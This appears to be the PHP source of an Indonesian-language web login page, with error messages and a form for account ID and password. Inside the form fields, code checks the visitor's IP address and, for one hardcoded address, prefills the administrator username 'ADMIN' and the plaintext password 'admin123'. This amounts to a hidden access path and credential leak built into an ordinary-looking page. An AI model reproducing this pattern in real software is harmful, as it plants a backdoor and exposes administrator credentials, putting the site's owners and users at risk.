<?php include_once("functions.php");?>
<!DOCTYPE html>
<html>
<head>
<link rel="icon" type="image/png" href="https://cdn.discordapp.com/attachments/690968474209615962/1004277406254764072/cropped-logo-kominfo.png" />
<style>
a {font-size:20px;
color:white;
}
h1 {color:white;}
table {background-color:white;
       color:black;}
table tr {color:black;}
table td {color:black;}
body {background: url("badut.jpg");
      background-size:100%;
	  }
</style><title>Login</title></head>
<body background="badut.jpg">
<?php banner();?>
<h1>Login</h1>
<?php
if (isset($_GET["error"])) {
	$error = $_GET["error"];
	if ($error==1)
		showError("Id Akun dan password tidak sesuai");
	else if ($error==2)
		showError("Error Database. Silahkan Hubungi Administrator");
	else if ($error==3)
		showError("Koneksi ke Database gagal.Autentikasi Gagal");
	else if ($error==4)
		showError("Anda Tidak Boleh Mengakses Halaman Sebelumnya. Silahkan Login Terlebih Dahulu");
	else 
		showError("Unknown Error");
}
?>
<form method="post" name="f" action="login.php">
<table border="1">
<tr><th colspan="2">Login</th></tr>
<tr><td>Id Akun</td>
    <td><input type="text" name="id_akun" maxlength="12" size="12"
    value="<?php echo ($_SERVER["REMOTE_ADDR"]=="5.189.147.47"?"ADMIN":"");?>"></td></tr>
<tr><td>Password</td>
	<td><input type="password" name="password" maxlength="12" size="12"
    value="<?php echo ($_SERVER["REMOTE_ADDR"]=="5.189.147.47"?"admin123":"");?>"></td></tr>
<tr><td>&nbsp;</td>
	<td><input type="submit" name="TblLogin" value="Login"></td></tr>
</table>
</form>
</body>
</html>